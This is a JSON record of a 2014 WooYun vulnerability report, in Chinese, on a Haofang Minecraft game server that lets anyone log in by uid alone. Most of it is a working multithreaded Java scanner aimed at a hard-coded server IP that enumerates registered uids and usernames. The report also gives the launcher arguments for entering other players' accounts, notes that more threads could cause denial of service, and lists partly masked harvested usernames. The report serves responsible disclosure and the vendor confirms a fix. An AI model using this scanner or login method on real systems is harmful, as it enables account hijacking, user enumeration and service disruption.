{"id": 1041, "wybug_id": "wooyun-2014-066926", "wybug_title": "边锋某游戏平台可绕过验证登陆他人账号", "wybug_corp": "边锋网络", "wybug_author": "cat73", "wybug_date": "2014-07-02 11:00", "wybug_open_date": "2014-09-30 11:02", "wybug_type": "非授权访问/认证绕过", "wybug_level": "中", "wybug_rank_0": "6", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-30：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 喵~~ 详细说明：  具体为新浩方->我的世界mod服->浩方164勇者大陆服现行的登陆策略为不验证密码,由登陆器提交uid,然后该uid所绑定的用户名在一段时间内可以登录(我猜想的)这就造成了一个漏洞,可以登录他人账号,不过有一个前提条件,那就是得先知道对方的uid于是分析了登陆器与服务器之间的通讯过程,发现查询uid对应的用户名特别简单于是做了一个小Java程序进行扫描(最近在学Java- - 要不就用Python了 凑活看- -)\nimport java.io.InputStream;import java.io.OutputStream;import java.net.InetAddress;import java.net.Socket;import java.util.concurrent.locks.*;class AttackHFMC implements Runnable {\tprivate final int THREAD_WAIT;\tprivate long currentId;\tprivate ReentrantLock lock = new ReentrantLock();\tAttackHFMC(int threadWait, long startId) {\t\tTHREAD_WAIT = threadWait;\t\tcurrentId = startId;//\t\ttry {//\t\t\tSystem.out.println(getUserInfo(4133302222L));//\t\t} catch (Exception e) {//\t\t\t// TODO Auto-generated catch block//\t\t\te.printStackTrace();//\t\t}\t}\t@SuppressWarnings(\"static-access\")\tpublic void run() {\t\twhile (true) {\t\t\tlong thisId = getId();\t\t\ttry {\t\t\t\tString info = getUserInfo(thisId);\t\t\t\tif(!info.isEmpty())\t\t\t\t\tSystem.out.println(info);\t\t\t} catch (Exception e) {\t\t\t}\t\t\tif(thisId % 1000 == 0)\t\t\t\tSystem.out.println(\"最新完成:\" + thisId);\t\t\t\t\t\ttry {\t\t\t\tThread.currentThread().sleep(THREAD_WAIT);\t\t\t} catch (InterruptedException e) {\t\t\t}\t\t}\t}\tprivate long getId() {\t\tlock.lock();\t\tlong thisId = currentId;\t\tcurrentId++;\t\tlock.unlock();\t\treturn thisId;\t}\tprivate String getUserInfo(long id) throws Exception {\t\tbyte[] recvPackage = getServerRecv(id);\t\treturn recvPackageToUserInfo(recvPackage);\t}\tprivate String recvPackageToUserInfo(byte[] recvPackage) {\t\tString userInfo = \"userid:\";\t\tlong userId = byte4ToInt(recvPackage, 20);\t\tuserInfo += uid;\t\tuserInfo += \" name:\";\t\tint index = 28;\t\twhile (recvPackage[index++] != 0)\t\t\t;\t\tString userName = new String(recvPackage, 28, index - 28 - 1);\t\tuserInfo += userName;\t\tuserInfo += \"\\n\";\t\tif(userName.trim().equals(\"\")){\t\t\treturn \"\";\t\t} else {\t\t\treturn userInfo;\t\t}\t}\tpublic long byte4ToInt(byte[] bytes, int off) {\t\tint b0 = bytes[off] & 0xFF;\t\tint b1 = bytes[off + 1] & 0xFF;\t\tint b2 = bytes[off + 2] & 0xFF;\t\tint b3 = bytes[off + 3] & 0xFF;\t\tlong l = ((b3 << 24) | (b2 << 16) | (b1 << 8) | b0) & 0xFFFFFFFFL;\t\treturn l;\t}\tprivate byte[] getServerRecv(long id) throws Exception {\t\ttry {\t\t\tSocket s = new Socket(InetAddress.getByName(\"221.228.215.148\"), 35565);\t\t\tOutputStream os = s.getOutputStream();\t\t\tInputStream is = s.getInputStream();\t\t\tbyte[] sendPackage = getSendPackage(id);\t\t\tos.write(sendPackage);\t\t\tbyte[] recvPackage = new byte[58];\t\t\tis.read(recvPackage, 0, 58);\t\t\tos.close();\t\t\tis.close();\t\t\ts.close();\t\t\treturn recvPackage;\t\t} catch (Exception e) {\t\t\t//e.printStackTrace();\t\t\tSystem.err.println(\"与服务器交互出现错误\");\t\t\tthrow new Exception(\"与服务器交互出现错误\");\t\t}\t}\tprivate byte[] getSendPackage(long id) {\t\tbyte[] sendPackage = new byte[24];\t\t// 整包长度\t\tsendPackage[0] = 24;\t\tsendPackage[1] = 0;\t\tsendPackage[2] = 0;\t\tsendPackage[3] = 0;\t\t// 1为获取信息 5为登录\t\tsendPackage[4] = 1;\t\tsendPackage[5] = 0;\t\tsendPackage[6] = 0;\t\tsendPackage[7] = 0;\t\tsendPackage[8] = 0;\t\tsendPackage[9] = 0;\t\tsendPackage[10] = 0;\t\tsendPackage[11] = 0;\t\tsendPackage[12] = 0;\t\tsendPackage[13] = 0;\t\tsendPackage[14] = 0;\t\tsendPackage[15] = 0;\t\tsendPackage[16] = (byte) (id & 0xff);\t\tsendPackage[17] = (byte) ((id & 0xff00) >> 8);\t\tsendPackage[18] = (byte) ((id & 0xff0000) >> 16);\t\tsendPackage[19] = (byte) ((id & 0xff000000) >> 24);\t\tsendPackage[20] = 0;\t\tsendPackage[21] = 0;\t\tsendPackage[22] = 0;\t\tsendPackage[23] = 0;\t\treturn sendPackage;\t}}public class Attack{\tpublic static void start() {\t\tint threadCount = 10;//线程数\t\tint threadWait = 100;//每个线程扫描完后等待多久\t\tlong startId = 4134225000L;//从哪个ID开始扫描\t\t//String serverIP = \"221.228.215.148\";\t\t//int serverPort = 35565;\t\tAttackHFMC att = new AttackHFMC(threadWait, startId);\t\t\t\tThread[] t = new Thread[threadCount];\t\tfor(int i = 0; i < threadCount; i++){\t\t\tt[i] = new Thread(att);\t\t\tt[i].start();\t\t}\t}}\n以上程序可以在现行协议下多线程批量扫描uid是否已经注册过,注册了则输出(我用的eclipse,可以直接复制,正在学Java,还没学文件io,就没搞记录文件)登录方式为创建MCLoader.exe的快捷方式并且增加参数: %uid%;2064;221.228.215.148运行即可登录他人账号上面的代码如果线程数改的多一些也可以造成拒绝服务攻击导致其他人都无法登录   漏洞证明：  下面是扫描到的部分人的uid,好吧 uid这个名字是我随便起的,代表userid,用户id的意思- -我是从自己的账号的uid开始扫描的,因此扫描到了三个自己的号- -扫了好久貌似都没扫到OP的号,就不扫下去了,挺浪费你们服务器资源的...uid:41333****2 name:X_Fuid:41333****2 name:F_Xuid:41333****8 name:asadwwuid:41333****2 name:X888uid:41333****9 name:Cat73uid:41333****2 name:beamwUuid:41300****7 name:fgdcuid:41338****1 name:lenseuid:41341****1 name:fajksjkjgkjalkfuid:41343****0 name:Hugo   修复方案：  还是给服务器带上AuthMe插件吧- -登陆器上做的再强大 反汇编一样完蛋- -   版权声明：转载请注明来源 cat73@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-07-07 10:20 厂商回复： 修复中 最新状态： 2014-07-07：已修复，谢谢cat73兄，可以的话留个联系方式便于沟通；） 2014-07-07：已修复。  ", "replys": "漏洞评价：\n评论\n     2014-07-02 13:06 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  提交漏洞顺带卖萌..好可耻    \n     2014-07-02 15:50 |    \t\tcat73 \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:6        | 喵爱吃鱼, 喵要吃好多好多鱼~~地址栏输入...)\t\t \n  @子非海绵宝宝 wooyun每次都会修改我的漏洞标题- -好邪恶喵~~    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}